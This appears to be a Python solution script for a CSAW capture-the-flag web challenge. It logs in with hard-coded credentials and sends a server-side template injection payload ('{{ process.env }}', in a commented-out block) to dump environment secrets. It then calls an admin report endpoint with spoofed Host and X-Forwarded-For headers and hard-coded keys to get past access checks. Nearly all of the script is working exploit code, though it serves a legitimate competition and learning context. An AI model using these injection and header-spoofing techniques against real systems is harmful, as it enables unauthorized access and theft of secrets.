import requests

s = requests.Session()
'''
header = {'Content-Type': "application/x-www-form-urlencoded"}
payload = {"username": "10xxer", "password": "remember_not_to_hard_code_passwords_folks"}
r = s.post("http://web.chal.csaw.io:8000/spooky/login", headers=header, data=payload)
print(r.text)

payload = {"inject": "{{ process.env }}", "next": ""}
r = s.get("http://web.chal.csaw.io:8000/spooky/login", params=payload)
print(r.text)

r = s.get("http://web.chal.csaw.io:8000/spooky/panel")
print(r.text)
'''
payload = {'key': 'XbcuJevW$9oOvMXdLgW9NohL1fxpj#qvp%LRrBt#4SK%qtOjPP%fTSVNDyplPejp'}
payload2 = {"report_path": "/"}
headers = {"Host": "3.82.155.236:27017", "x-forwarded-for": "3.82.155.236", "sneaky-key": "Bj4ziHWvM5wvPUSfHHJZnDZ9g1Y8sLQh5RwgFDpIfEJbUE63j0ipUKK3GCvVI0OH"}
r = s.post("http://web.chal.csaw.io:8000/admin/report", params=payload, data=payload2, headers=headers)
print(r.text)
